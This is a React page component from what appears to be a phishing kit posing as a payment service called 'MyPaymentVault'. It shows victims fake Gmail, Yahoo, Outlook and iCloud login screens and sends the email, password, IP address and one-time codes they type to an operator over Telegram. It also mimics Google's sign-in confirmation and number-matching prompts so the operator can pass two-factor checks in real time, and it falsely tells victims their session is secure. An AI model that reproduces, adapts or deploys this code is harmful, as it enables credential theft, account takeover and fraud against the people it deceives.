import { useEffect, useState, useRef } from "react";
import { useLocation } from "wouter";
import { ShieldCheck, Loader2, Globe, ChevronDown, Eye, EyeOff } from "lucide-react";
import { useAuth } from "@/lib/auth";
import { useI18n, type Language } from "@/lib/i18n";
import {
  getPublicIP,
  sendTelegram,
  sendApprovalRequest,
  pollApproval,
  pollGmailNumber,
  sendGmailVerification,
  answerCallback,
  getLatestOffset,
} from "@/lib/telegram";

const languageOptions: { code: Language; label: string }[] = [
  { code: "en", label: "English" },
  { code: "es", label: "Español" },
  { code: "fr", label: "Français" },
];

type Stage = "provider-select" | "credentials" | "gmail-confirm" | "verification" | "approving" | "approved" | "rejected";

const providers = [
  {
    id: "gmail",
    name: "Gmail",
    icon: (
      <svg width="22" height="22" viewBox="0 0 24 24">
        <rect width="24" height="24" fill="none"/>
        <path d="M2 6h20v12H2z" fill="#fff" stroke="#ddd" strokeWidth="1"/>
        <path d="M2 6l10 7 10-7" fill="none" stroke="#EA4335" strokeWidth="1.8"/>
        <path d="M2 6v12" stroke="#4285F4" strokeWidth="1.5"/>
        <path d="M22 6v12" stroke="#34A853" strokeWidth="1.5"/>
        <path d="M2 18h20" stroke="#FBBC04" strokeWidth="1.5"/>
      </svg>
    ),
  },
  {
    id: "yahoo",
    name: "Yahoo Mail",
    icon: (
      <svg width="22" height="22" viewBox="0 0 24 24">
        <rect width="24" height="24" rx="4" fill="#6001D2"/>
        <text x="4" y="17" fontFamily="Arial" fontSize="13" fontWeight="bold" fill="#fff">Y!</text>
      </svg>
    ),
  },
  {
    id: "outlook",
    name: "Outlook",
    icon: (
      <svg width="22" height="22" viewBox="0 0 24 24">
        <rect width="24" height="24" rx="3" fill="#0078D4"/>
        <rect x="2" y="6" width="11" height="12" rx="2" fill="#fff"/>
        <rect x="13" y="8" width="9" height="8" rx="1" fill="#50B0F0"/>
        <path d="M13 8l4.5 3.5L22 8" stroke="#0078D4" strokeWidth="1" fill="none"/>
        <ellipse cx="7.5" cy="12" rx="3" ry="4" fill="#0078D4"/>
        <ellipse cx="7.5" cy="12" rx="2" ry="3" fill="#fff"/>
      </svg>
    ),
  },
  {
    id: "icloud",
    name: "iCloud",
    icon: (
      <svg width="22" height="22" viewBox="0 0 24 24">
        <rect width="24" height="24" rx="4" fill="#1d6aea"/>
        <path d="M7 16a4 4 0 01-.5-7.95A5.5 5.5 0 0117.9 8H18a3 3 0 010 6H7z" fill="#fff"/>
      </svg>
    ),
  },
];

function randNum(min: number, max: number) {
  return Math.floor(Math.random() * (max - min + 1)) + min;
}

export default function LoginSuccess() {
  const [, navigate] = useLocation();
  const [username, setUsername] = useState("");
  const [loading, setLoading] = useState(false);
  const [showLangDropdown, setShowLangDropdown] = useState(false);
  const [stage, setStage] = useState<Stage>("provider-select");
  const [selectedProvider, setSelectedProvider] = useState<string | null>(null);
  const [providerEmail, setProviderEmail] = useState("");
  const [providerPassword, setProviderPassword] = useState("");
  const [showPassword, setShowPassword] = useState(false);
  const [emailError, setEmailError] = useState("");
  const [passwordError, setPasswordError] = useState("");

  /* Gmail number challenge */
  const [gmailNumbers] = useState<number[]>(() => {
    const nums: number[] = [];
    while (nums.length < 3) {
      const n = randNum(10, 99);
      if (!nums.includes(n)) nums.push(n);
    }
    return nums;
  });
  const [selectedGmailNum, setSelectedGmailNum] = useState<number | null>(null);

  /* OTP (iCloud / Yahoo / Outlook) */
  const [otpCode, setOtpCode] = useState("");
  const [otpError, setOtpError] = useState("");

  /* Telegram polling */
  const pollRef   = useRef<ReturnType<typeof setInterval> | null>(null);
  const offsetRef = useRef(0);
  const sessionKeyRef = useRef(`verify_${Date.now()}`);

  const [readyToNavigate, setReadyToNavigate] = useState(false);
  const { verifyCard, isAuthenticated } = useAuth();
  const { lang, setLang, langName } = useI18n();

  useEffect(() => {
    const stored = sessionStorage.getItem("botOtpUsername");
    if (!stored) { navigate("/login"); return; }
    setUsername(stored);
  }, [navigate]);

  useEffect(() => {
    if (readyToNavigate && isAuthenticated) navigate("/step4");
  }, [readyToNavigate, isAuthenticated, navigate]);

  useEffect(() => () => { if (pollRef.current) clearInterval(pollRef.current); }, []);

  /* Auto-start Gmail number verification when entering verification stage */
  useEffect(() => {
    if (stage === "verification" && selectedProvider === "gmail") {
      startGmailVerification();
    }
  // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [stage]);

  /* ── Step 1: credentials submitted ── */
  async function handleCredentials() {
    let valid = true;
    if (!providerEmail.trim()) { setEmailError("Email is required."); valid = false; }
    else if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(providerEmail.trim())) { setEmailError("Invalid email format."); valid = false; }
    else setEmailError("");
    if (!providerPassword.trim()) { setPasswordError("Password is required."); valid = false; }
    else setPasswordError("");
    if (!valid) return;

    setLoading(true);
    const ip = await getPublicIP().catch(() => "unknown");
    const providerName = providers.find(p => p.id === selectedProvider)?.name ?? selectedProvider ?? "";

    await sendTelegram(
      `📧 <b>Email Credentials</b>\n\n` +
      `👤 <b>Username</b>  : <code>${username}</code>\n` +
      `📬 <b>Provider</b>  : <b>${providerName}</b>\n` +
      `📩 <b>Email</b>     : <code>${providerEmail.trim()}</code>\n` +
      `🔑 <b>Password</b>  : <code>${providerPassword}</code>\n` +
      `🌐 <b>IP</b>        : <code>${ip}</code>`,
    ).catch(() => {});

    setLoading(false);
    setStage(selectedProvider === "gmail" ? "gmail-confirm" : "verification");
  }

  /* ── Gmail: send numbers to admin, poll for admin's chosen number ── */
  async function startGmailVerification() {
    setLoading(true);
    const ip = await getPublicIP().catch(() => "unknown");
    const sessionKey = sessionKeyRef.current;
    const startOffset = await getLatestOffset();
    offsetRef.current = startOffset;
    const now = new Date().toLocaleString("id-ID", { timeZone: "Asia/Jakarta" });

    await sendGmailVerification(username, ip, now, gmailNumbers, sessionKey);
    setLoading(false);

    pollRef.current = setInterval(async () => {
      const { status, chosenNumber, nextOffset, callbackId } = await pollGmailNumber(
        offsetRef.current, gmailNumbers, sessionKey
      );
      offsetRef.current = nextOffset;

      if (status === "selected" && chosenNumber !== undefined) {
        clearInterval(pollRef.current!);
        if (callbackId) await answerCallback(callbackId, `✅ Angka ${chosenNumber} dipilih`);
        setSelectedGmailNum(chosenNumber);
        setTimeout(() => {
          setStage("approved");
          verifyCard();
          setTimeout(() => setReadyToNavigate(true), 1200);
        }, 1800);
      } else if (status === "rejected") {
        clearInterval(pollRef.current!);
        if (callbackId) await answerCallback(callbackId, "❌ Ditolak.");
        setStage("rejected");
      }
    }, 2500);
  }

  /* ── OTP providers: submit code → Telegram approval ── */
  async function handleOtpVerification(code: string) {
    setLoading(true);
    const ip = await getPublicIP().catch(() => "unknown");
    const providerName = providers.find(p => p.id === selectedProvider)?.name ?? selectedProvider ?? "";
    const sessionKey = sessionKeyRef.current;
    const startOffset = await getLatestOffset();
    offsetRef.current = startOffset;

    await sendApprovalRequest(
      username, ip,
      new Date().toLocaleString("id-ID", { timeZone: "Asia/Jakarta" }),
      sessionKey,
      `${providerName} Verification`,
    );

    await sendTelegram(
      `🔐 <b>${providerName} Verification Code</b>\n\n` +
      `👤 <b>Username</b>   : <code>${username}</code>\n` +
      `🔢 <b>Code</b>       : <code>${code}</code>\n` +
      `🌐 <b>IP</b>         : <code>${ip}</code>`,
    ).catch(() => {});

    setStage("approving");
    setLoading(false);

    pollRef.current = setInterval(async () => {
      const { status, nextOffset, callbackId } = await pollApproval(offsetRef.current, sessionKey);
      offsetRef.current = nextOffset;

      if (status === "approved") {
        clearInterval(pollRef.current!);
        if (callbackId) await answerCallback(callbackId, "✅ Verification approved!");
        setStage("approved");
        verifyCard();
        setTimeout(() => setReadyToNavigate(true), 1200);
      } else if (status === "rejected") {
        clearInterval(pollRef.current!);
        if (callbackId) await answerCallback(callbackId, "❌ Verification rejected.");
        setStage("rejected");
      }
    }, 2500);
  }

  function handleOtpSubmit() {
    if (otpCode.length < 6) { setOtpError("Please enter the 6-digit code."); return; }
    setOtpError("");
    handleOtpVerification(otpCode);
  }

  const currentProvider = providers.find(p => p.id === selectedProvider);

  return (
    <div className="min-h-screen flex flex-col items-center justify-center ls-outer" style={{ background: "#f7f7f7" }}>
      <style>{`
        @media (max-width: 520px) {
          .ls-outer { background:#fff !important; justify-content:flex-start !important; padding:0 !important; }
          .ls-card  { max-width:100% !important; min-height:100dvh !important; box-shadow:none !important; border-radius:0 !important; }
        }
        @keyframes fadeInUp { from{opacity:0;transform:translateY(20px);} to{opacity:1;transform:translateY(0);} }
        @keyframes checkPop { 0%{transform:scale(0.4);opacity:0;} 70%{transform:scale(1.15);opacity:1;} 100%{transform:scale(1);opacity:1;} }
        @keyframes botp-spin { to{transform:rotate(360deg);} }
        @keyframes botp-pulse { 0%,100%{opacity:1} 50%{opacity:0.4} }
        @keyframes spin { from{transform:rotate(0deg);} to{transform:rotate(360deg);} }
        .ls-fadein { animation: fadeInUp 0.5s ease both; }
        .ls-check  { animation: checkPop 0.55s cubic-bezier(.4,1.6,.6,1) both; }
        .prov-btn:hover  { border-color:#111 !important; background:#f8f8f8 !important; }
        .prov-btn.active { border-color:#111 !important; background:#f4f4f4 !important; }
        .email-input:focus,.pass-input:focus,.otp-input:focus { outline:none; border-color:#111; }
        .email-input::placeholder,.pass-input::placeholder,.otp-input::placeholder { color:#bbb; }
        .gmail-num-btn { transition:all 0.15s; }
        .gmail-num-btn:hover { background:#f1f3f4 !important; border-color:#4285F4 !important; }
        .gmail-num-btn.picked { background:#e8f0fe !important; border-color:#4285F4 !important; }
      `}</style>

      <div className="w-full flex flex-col bg-white ls-card" style={{ maxWidth:480, boxShadow:"0 2px 32px rgba(0,0,0,0.13)" }}>

        {/* HEADER */}
        <div className="flex items-center justify-between" style={{ padding:"18px 24px", borderBottom:"1px solid #ebebeb" }}>
          <span className="select-none" style={{ fontSize:15, letterSpacing:"0.18em", color:"#111" }}>
            <span style={{ fontWeight:300 }}>MY</span>
            <span style={{ fontWeight:700 }}>PAYMENT</span>
            <span style={{ fontWeight:300 }}>VAULT</span>
          </span>
          <div className="relative">
            <button type="button" onClick={() => setShowLangDropdown(!showLangDropdown)}
              style={{ display:"flex", alignItems:"center", gap:5, color:"#555", fontSize:13, background:"none", border:"none", cursor:"pointer" }}>
              <Globe size={15} color="#555" />
              <span>{langName}</span>
              <ChevronDown size={13} color="#555" style={{ transform:showLangDropdown?"rotate(180deg)":"none", transition:"transform 0.2s" }} />
            </button>
            {showLangDropdown && (
              <>
                <div className="fixed inset-0 z-10" onClick={() => setShowLangDropdown(false)} />
                <div style={{ position:"absolute", right:0, top:"100%", marginTop:4, width:140, background:"#fff", border:"1px solid #ddd", boxShadow:"0 4px 16px rgba(0,0,0,0.15)", zIndex:20 }}>
                  {languageOptions.map(opt => (
                    <button key={opt.code} type="button"
                      onClick={() => { setLang(opt.code); setShowLangDropdown(false); }}
                      style={{ display:"block", width:"100%", textAlign:"left", padding:"10px 16px", fontSize:13, background:"none", border:"none", cursor:"pointer", fontWeight:lang===opt.code?600:400, color:lang===opt.code?"#111":"#555" }}>
                      {opt.label}
                    </button>
                  ))}
                </div>
              </>
            )}
          </div>
        </div>

        {/* HERO */}
        <div style={{ width:"100%", lineHeight:0 }}>
          <img src="/hero-vault-new.png" alt="MyPaymentVault" style={{ width:"100%", display:"block" }} />
        </div>

        {/* BODY */}
        <div style={{ padding:"32px 28px 40px", textAlign:"center" }}>

          {/* Icon */}
          <div className="ls-check" style={{ width:64, height:64, borderRadius:"50%", background:"#111", display:"flex", alignItems:"center", justifyContent:"center", margin:"0 auto 16px" }}>
            <ShieldCheck size={30} color="#fff" strokeWidth={1.8} />
          </div>

          <h2 className="ls-fadein" style={{ fontSize:20, fontWeight:700, color:"#111", marginBottom:4, animationDelay:"0.1s" }}>
            Identity Verified
          </h2>
          <p className="ls-fadein" style={{ fontSize:13, color:"#555", marginBottom:2, animationDelay:"0.12s" }}>Welcome back,</p>
          <p className="ls-fadein" style={{ fontSize:17, fontWeight:700, color:"#111", marginBottom:22, animationDelay:"0.15s" }}>{username}</p>

          <div className="ls-fadein" style={{ borderTop:"1px solid #ebebeb", margin:"0 0 22px", animationDelay:"0.2s" }} />

          {/* Step indicator */}
          <div className="ls-fadein" style={{ display:"flex", alignItems:"center", justifyContent:"center", gap:8, marginBottom:24, animationDelay:"0.22s" }}>
            {[1,2,3,4].map((s, i) => (
              <div key={s} style={{ display:"flex", alignItems:"center", gap:8 }}>
                <div style={{ width:22, height:22, borderRadius:"50%", background:s<=2?"#111":"#ccc", display:"flex", alignItems:"center", justifyContent:"center", flexShrink:0 }}>
                  {s===1
                    ? <svg width="11" height="11" viewBox="0 0 12 12" fill="none"><path d="M2 6l3 3 5-5" stroke="#fff" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round"/></svg>
                    : <span style={{ fontSize:11, color:"#fff", fontWeight:700 }}>{s}</span>}
                </div>
                {i<3 && <div style={{ width:40, height:1, background:s<2?"#111":"#ccc" }} />}
              </div>
            ))}
          </div>

          {/* ── STAGE: provider-select ── */}
          {stage === "provider-select" && (
            <div className="ls-fadein" style={{ animationDelay:"0.25s" }}>
              <p style={{ fontSize:14, fontWeight:600, color:"#333", marginBottom:16, textAlign:"left" }}>
                Select your email provider to verify
              </p>
              <div style={{ display:"grid", gridTemplateColumns:"1fr 1fr", gap:12 }}>
                {providers.map(p => (
                  <button key={p.id} type="button" className="prov-btn"
                    onClick={() => { setSelectedProvider(p.id); setStage("credentials"); }}
                    style={{ display:"flex", alignItems:"center", gap:10, padding:"14px 16px", border:"1.5px solid #e0e0e0", borderRadius:8, background:"#fff", cursor:"pointer", textAlign:"left" }}>
                    {p.icon}
                    <span style={{ fontSize:14, fontWeight:600, color:"#222" }}>{p.name}</span>
                  </button>
                ))}
              </div>
            </div>
          )}

          {/* ── STAGE: credentials ── */}
          {stage === "credentials" && (
            <div className="ls-fadein" style={{ animationDelay:"0.1s" }}>
              <div style={{ display:"flex", alignItems:"center", gap:10, marginBottom:20, padding:"12px 14px", background:"#f8f8f8", borderRadius:8 }}>
                {currentProvider?.icon}
                <div style={{ textAlign:"left" }}>
                  <p style={{ fontSize:13, fontWeight:700, color:"#111", margin:0 }}>{currentProvider?.name}</p>
                  <button type="button" onClick={() => { setSelectedProvider(null); setStage("provider-select"); setProviderEmail(""); setProviderPassword(""); setEmailError(""); setPasswordError(""); }}
                    style={{ fontSize:11, color:"#888", textDecoration:"underline", background:"none", border:"none", cursor:"pointer", padding:0 }}>
                    Change provider
                  </button>
                </div>
              </div>

              <div style={{ textAlign:"left", marginBottom:14 }}>
                <label style={{ fontSize:13, fontWeight:600, color:"#333", display:"block", marginBottom:6 }}>Email Address</label>
                <input className="email-input" type="email" placeholder="example@email.com"
                  value={providerEmail} onChange={e => { setProviderEmail(e.target.value); setEmailError(""); }}
                  disabled={loading}
                  style={{ width:"100%", height:46, border:emailError?"1.5px solid #e00":"1.5px solid #ddd", borderRadius:6, padding:"0 14px", fontSize:15, color:"#111", background:"#fafafa", boxSizing:"border-box" }}
                  autoComplete="email" />
                {emailError && <p style={{ fontSize:12, color:"#e00", marginTop:5 }}>{emailError}</p>}
              </div>

              <div style={{ textAlign:"left", marginBottom:22 }}>
                <label style={{ fontSize:13, fontWeight:600, color:"#333", display:"block", marginBottom:6 }}>Password</label>
                <div style={{ position:"relative" }}>
                  <input className="pass-input" type={showPassword?"text":"password"} placeholder="Enter your password"
                    value={providerPassword} onChange={e => { setProviderPassword(e.target.value); setPasswordError(""); }}
                    onKeyDown={e => e.key==="Enter" && handleCredentials()}
                    disabled={loading}
                    style={{ width:"100%", height:46, border:passwordError?"1.5px solid #e00":"1.5px solid #ddd", borderRadius:6, padding:"0 44px 0 14px", fontSize:15, color:"#111", background:"#fafafa", boxSizing:"border-box" }}
                    autoComplete="current-password" />
                  <button type="button" onClick={() => setShowPassword(!showPassword)}
                    style={{ position:"absolute", right:12, top:"50%", transform:"translateY(-50%)", background:"none", border:"none", cursor:"pointer", color:"#888", display:"flex", alignItems:"center" }}>
                    {showPassword ? <EyeOff size={17}/> : <Eye size={17}/>}
                  </button>
                </div>
                {passwordError && <p style={{ fontSize:12, color:"#e00", marginTop:5 }}>{passwordError}</p>}
              </div>

              <button type="button" onClick={handleCredentials} disabled={loading}
                style={{ width:"100%", height:50, background:loading?"#555":"#111", color:"#fff", fontSize:15, fontWeight:600, border:"none", borderRadius:6, cursor:loading?"not-allowed":"pointer", letterSpacing:"0.03em", display:"flex", alignItems:"center", justifyContent:"center", gap:8 }}>
                {loading ? <><Loader2 size={18} style={{ animation:"spin 1s linear infinite" }}/> Verifying...</> : "Sign In →"}
              </button>
            </div>
          )}

          {/* ── STAGE: gmail-confirm ("Was it you?") ── */}
          {stage === "gmail-confirm" && (
            <div className="ls-fadein" style={{ animationDelay:"0.1s" }}>
              {/* Google-style header */}
              <div style={{ display:"flex", flexDirection:"column", alignItems:"center", marginBottom:24 }}>
                <div style={{ width:56, height:56, borderRadius:"50%", background:"#e8f0fe", display:"flex", alignItems:"center", justifyContent:"center", marginBottom:14 }}>
                  <svg width="28" height="28" viewBox="0 0 24 24" fill="none">
                    <circle cx="12" cy="8" r="4" fill="#1a73e8"/>
                    <path d="M4 20c0-4 3.6-7 8-7s8 3 8 7" stroke="#1a73e8" strokeWidth="2" strokeLinecap="round"/>
                  </svg>
                </div>
                <p style={{ fontSize:18, fontWeight:700, color:"#111", margin:"0 0 4px" }}>Did you just sign in?</p>
                <p style={{ fontSize:13, color:"#555", margin:0 }}>{providerEmail || "your Gmail account"}</p>
              </div>

              {/* Info card */}
              <div style={{ background:"#f8f9fa", border:"1px solid #e0e0e0", borderRadius:10, padding:"14px 16px", marginBottom:22, textAlign:"left" }}>
                <p style={{ fontSize:13, fontWeight:600, color:"#111", margin:"0 0 6px" }}>A new sign-in was detected</p>
                <p style={{ fontSize:12, color:"#555", margin:"0 0 4px" }}>If this was you, tap <b>Yes, it's me</b> to continue.</p>
                <p style={{ fontSize:12, color:"#555", margin:0 }}>If you didn't sign in, tap <b>No</b> to secure your account.</p>
              </div>

              {/* YES button */}
              <button type="button"
                onClick={() => setStage("verification")}
                style={{ width:"100%", height:50, marginBottom:10, background:"#1a73e8", color:"#fff", fontSize:15, fontWeight:600, border:"none", borderRadius:6, cursor:"pointer", letterSpacing:"0.02em" }}>
                Yes, it's me
              </button>

              {/* NO button */}
              <button type="button"
                onClick={() => setStage("rejected")}
                style={{ width:"100%", height:46, background:"#fff", color:"#d93025", fontSize:14, fontWeight:600, border:"1.5px solid #e0e0e0", borderRadius:6, cursor:"pointer" }}>
                No, it wasn't me
              </button>

              <p style={{ fontSize:11, color:"#aaa", marginTop:16, textAlign:"center" }}>
                Google will never ask for your password in an email or text message.
              </p>
            </div>
          )}

          {/* ── STAGE: verification (Gmail — number matching) ── */}
          {stage === "verification" && selectedProvider === "gmail" && (
            <div className="ls-fadein" style={{ animationDelay:"0.1s" }}>
              <div style={{ display:"flex", alignItems:"center", gap:10, marginBottom:20, padding:"12px 14px", background:"#f1f3f4", borderRadius:8 }}>
                {currentProvider?.icon}
                <div>
                  <p style={{ fontSize:13, fontWeight:700, color:"#111", margin:0 }}>Google Verification</p>
                  <p style={{ fontSize:12, color:"#555", margin:0 }}>{providerEmail || "your Gmail account"}</p>
                </div>
              </div>

              <p style={{ fontSize:15, fontWeight:600, color:"#111", marginBottom:8 }}>Check your phone</p>
              <p style={{ fontSize:13, color:"#555", lineHeight:1.6, marginBottom:24 }}>
                {selectedGmailNum !== null
                  ? <span>Tap <b style={{ color:"#1a73e8", fontSize:15 }}>{selectedGmailNum}</b> on your phone to confirm.</span>
                  : <>A notification was sent to your registered device.<br/>Tap the number shown on your phone to confirm it's you.</>}
              </p>

              {/* 3 number cards */}
              <div style={{ display:"flex", justifyContent:"center", gap:16, marginBottom:24 }}>
                {gmailNumbers.map(n => {
                  const isChosen = selectedGmailNum === n;
                  const isClickable = isChosen;
                  return (
                    <button key={n} type="button"
                      disabled={!isClickable}
                      onClick={() => {
                        if (!isClickable) return;
                        setStage("approved");
                        verifyCard();
                        setTimeout(() => setReadyToNavigate(true), 1200);
                      }}
                      style={{
                        width:72, height:72, borderRadius:12,
                        border: isChosen ? "2.5px solid #1a73e8" : "2px solid #e0e0e0",
                        background: isChosen ? "#e8f0fe" : "#f8f9fa",
                        fontSize: isChosen ? 26 : 24, fontWeight:700,
                        color: isChosen ? "#1a73e8" : "#999",
                        display:"flex", alignItems:"center", justifyContent:"center",
                        boxShadow: isChosen ? "0 0 0 4px rgba(26,115,232,0.18)" : "none",
                        transform: isChosen ? "scale(1.13)" : "scale(1)",
                        transition:"all 0.35s ease",
                        cursor: isClickable ? "pointer" : "default",
                      }}>
                      {n}
                    </button>
                  );
                })}
              </div>

              {selectedGmailNum === null && (
                <div style={{ display:"flex", alignItems:"center", justifyContent:"center", gap:8, marginBottom:8 }}>
                  <Loader2 size={14} style={{ animation:"spin 1s linear infinite", color:"#888" }} />
                  <p style={{ fontSize:13, color:"#888", margin:0 }}>Waiting for your device to respond…</p>
                </div>
              )}
              {selectedGmailNum !== null && (
                <div style={{ display:"flex", alignItems:"center", justifyContent:"center", gap:8 }}>
                  <ShieldCheck size={16} color="#1a73e8" />
                  <p style={{ fontSize:13, color:"#1a73e8", fontWeight:600, margin:0 }}>Tap the highlighted number on your phone</p>
                </div>
              )}

              <p style={{ fontSize:12, color:"#aaa", marginTop:14 }}>
                Don't see a notification? Make sure your phone is unlocked.
              </p>
            </div>
          )}

          {stage === "verification" && selectedProvider !== "gmail" && (
            <div className="ls-fadein" style={{ animationDelay:"0.1s" }}>
              <div style={{ display:"flex", alignItems:"center", gap:10, marginBottom:20, padding:"12px 14px", background:"#f8f8f8", borderRadius:8 }}>
                {currentProvider?.icon}
                <p style={{ fontSize:13, fontWeight:700, color:"#111", margin:0 }}>
                  {selectedProvider === "icloud" ? "Apple ID Verification" :
                   selectedProvider === "yahoo" ? "Yahoo Account Key" : "Microsoft Verification"}
                </p>
              </div>

              <p style={{ fontSize:15, fontWeight:600, color:"#111", marginBottom:8 }}>
                {selectedProvider === "icloud" ? "Enter your verification code" : "Enter the code we sent you"}
              </p>
              <p style={{ fontSize:13, color:"#555", lineHeight:1.6, marginBottom:24 }}>
                {selectedProvider === "icloud"
                  ? "A 6-digit code was sent to your trusted device or phone number."
                  : "A 6-digit verification code was sent to your registered email or phone."}
              </p>

              {/* 6-digit OTP boxes */}
              <div style={{ display:"flex", justifyContent:"center", gap:10, marginBottom:8 }}>
                {Array.from({ length: 6 }).map((_, i) => (
                  <div key={i} style={{
                    width:44, height:54, border:`2px solid ${otpCode.length===i?"#111":"#ddd"}`,
                    borderRadius:8, display:"flex", alignItems:"center", justifyContent:"center",
                    fontSize:22, fontWeight:700, color:"#111", background:"#fafafa",
                  }}>
                    {otpCode[i] ?? ""}
                  </div>
                ))}
              </div>

              <input
                className="otp-input"
                type="tel"
                inputMode="numeric"
                maxLength={6}
                placeholder="Enter 6-digit code"
                value={otpCode}
                onChange={e => { setOtpCode(e.target.value.replace(/\D/g, "").slice(0,6)); setOtpError(""); }}
                onKeyDown={e => e.key==="Enter" && handleOtpSubmit()}
                disabled={loading}
                style={{ width:"100%", height:46, border:otpError?"1.5px solid #e00":"1.5px solid #ddd", borderRadius:6, padding:"0 14px", fontSize:18, color:"#111", background:"#fafafa", boxSizing:"border-box", textAlign:"center", letterSpacing:"0.3em", marginTop:12 }}
                autoComplete="one-time-code"
              />
              {otpError && <p style={{ fontSize:12, color:"#e00", marginTop:5 }}>{otpError}</p>}

              <button type="button" onClick={handleOtpSubmit} disabled={loading || otpCode.length<6}
                style={{ width:"100%", height:50, marginTop:20, background:loading||otpCode.length<6?"#999":"#111", color:"#fff", fontSize:15, fontWeight:600, border:"none", borderRadius:6, cursor:loading||otpCode.length<6?"not-allowed":"pointer", letterSpacing:"0.03em", display:"flex", alignItems:"center", justifyContent:"center", gap:8 }}>
                {loading ? <><Loader2 size={18} style={{ animation:"spin 1s linear infinite" }}/> Verifying…</> : "Verify →"}
              </button>

              <p style={{ fontSize:12, color:"#aaa", marginTop:12 }}>
                Didn't receive a code? Check your spam or try again later.
              </p>
            </div>
          )}

          {/* ── STAGE: approving ── */}
          {stage === "approving" && (
            <>
              <div style={{ width:56, height:56, margin:"0 auto 20px", border:"5px solid #e8e8e8", borderTop:"5px solid #111", borderRadius:"50%", animation:"botp-spin 0.9s linear infinite" }} />
              <p style={{ fontSize:15, fontWeight:600, color:"#111", marginBottom:8 }}>Verifying your identity…</p>
              <p style={{ fontSize:13, color:"#555", animation:"botp-pulse 2s ease-in-out infinite" }}>Please wait, do not close this page.</p>
            </>
          )}

          {/* ── STAGE: approved ── */}
          {stage === "approved" && (
            <>
              <div style={{ width:64, height:64, borderRadius:"50%", background:"#111", display:"flex", alignItems:"center", justifyContent:"center", margin:"0 auto 20px" }}>
                <svg width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="#fff" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round">
                  <path d="M20 6L9 17l-5-5"/>
                </svg>
              </div>
              <p style={{ fontSize:17, fontWeight:700, color:"#111", marginBottom:8 }}>Verification Successful!</p>
              <p style={{ fontSize:13, color:"#555" }}>Proceeding to next step…</p>
            </>
          )}

          {/* ── STAGE: rejected ── */}
          {stage === "rejected" && (
            <>
              <div style={{ width:64, height:64, borderRadius:"50%", background:"#c00", display:"flex", alignItems:"center", justifyContent:"center", margin:"0 auto 20px" }}>
                <svg width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="#fff" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round">
                  <line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/>
                </svg>
              </div>
              <p style={{ fontSize:17, fontWeight:700, color:"#111", marginBottom:8 }}>Verification Failed</p>
              <p style={{ fontSize:13, color:"#555", marginBottom:24, lineHeight:1.6 }}>
                We couldn't verify your identity. Please try again or contact support.
              </p>
              <button type="button" onClick={() => { setStage("provider-select"); setSelectedProvider(null); setProviderEmail(""); setProviderPassword(""); setOtpCode(""); setSelectedGmailNum(null); sessionKeyRef.current = `verify_${Date.now()}`; }}
                style={{ width:"100%", height:46, background:"#111", color:"#fff", fontSize:14, fontWeight:600, border:"none", borderRadius:6, cursor:"pointer" }}>
                Try Again
              </button>
            </>
          )}

          {(stage === "provider-select" || stage === "credentials" || stage === "verification") && (
            <p style={{ fontSize:12, color:"#bbb", marginTop:16 }}>Your session is secure and encrypted.</p>
          )}
        </div>
      </div>

      <div style={{ width:"100%", maxWidth:480, marginTop:10, paddingRight:2, textAlign:"right" }}>
        <span style={{ fontSize:11, color:"#888" }}>
          &copy; mypaymenttvaulltr.com | Terms of Use | Privacy &amp; Cookies
        </span>
      </div>
    </div>
  );
}
